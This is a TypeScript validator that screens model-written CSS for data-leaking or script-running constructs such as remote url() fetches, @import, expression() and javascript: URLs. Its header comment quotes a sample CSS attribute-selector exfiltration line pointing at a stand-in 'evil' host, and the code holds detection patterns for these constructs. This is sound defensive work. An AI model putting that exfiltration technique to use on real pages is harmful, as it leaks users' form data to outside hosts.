/**
 * Hard checks on model-written CSS that the model cannot talk its way past.
 *
 * CSS can leak page data: an attribute selector plus a remote url() turns into
 * a request that encodes what's on the page (e.g. `input[value^="a"] { background: url(https://evil/a) }`).
 * So any network fetch from CSS is rejected; data: URIs and in-document
 * fragment references are allowed.
 */

export const MAX_CSS_LENGTH = 200_000;

export interface CssCheck {
  ok: boolean;
  problems: string[];
}

/** Remove comments so they can't hide or split a forbidden construct. */
function stripComments(css: string): string {
  return css.replace(/\/\*[\s\S]*?\*\//g, ' ');
}

/** Resolve CSS escapes like `\75 rl(` or `u\rl(` so they can't disguise a function name. */
function unescapeCss(css: string): string {
  return css
    .replace(/\\([0-9a-fA-F]{1,6})\s?/g, (_, hex: string) => String.fromCodePoint(parseInt(hex, 16)))
    .replace(/\\(.)/g, '$1');
}

const URL_FUNCTION = /\b(?:url|src)\(\s*(?:"([^"]*)"|'([^']*)'|([^)]*))\s*\)/gi;
const IMAGE_SET_STRING = /\b(?:-webkit-)?image-set\(([^)]*)\)/gi;

function isAllowedResource(raw: string): boolean {
  const value = raw.trim();
  return value === '' || /^data:/i.test(value) || value.startsWith('#');
}

export function checkCss(css: string): CssCheck {
  const problems: string[] = [];
  if (css.length > MAX_CSS_LENGTH) {
    problems.push(`CSS is ${css.length} characters; the limit is ${MAX_CSS_LENGTH}.`);
  }
  const normalized = unescapeCss(stripComments(css));

  if (/@import\b/i.test(normalized)) problems.push('@import is not allowed (no remote stylesheets).');
  if (/\bexpression\s*\(/i.test(normalized)) problems.push('expression() is not allowed.');
  if (/javascript\s*:/i.test(normalized)) problems.push('javascript: URLs are not allowed.');
  if (/-moz-binding|\bbehavior\s*:/i.test(normalized)) problems.push('-moz-binding and behavior are not allowed.');
  if (/<\/?\s*style/i.test(normalized)) problems.push('HTML tags are not allowed inside CSS.');

  for (const match of normalized.matchAll(URL_FUNCTION)) {
    const target = match[1] ?? match[2] ?? match[3] ?? '';
    if (!isAllowedResource(target)) {
      problems.push(`Remote resource "${target.trim().slice(0, 80)}" is not allowed; only data: URIs are permitted.`);
    }
  }
  for (const match of normalized.matchAll(IMAGE_SET_STRING)) {
    for (const quoted of (match[1] ?? '').matchAll(/"([^"]*)"|'([^']*)'/g)) {
      const target = quoted[1] ?? quoted[2] ?? '';
      if (!isAllowedResource(target)) {
        problems.push(`Remote resource "${target.slice(0, 80)}" in image-set() is not allowed.`);
      }
    }
  }
  return { ok: problems.length === 0, problems };
}
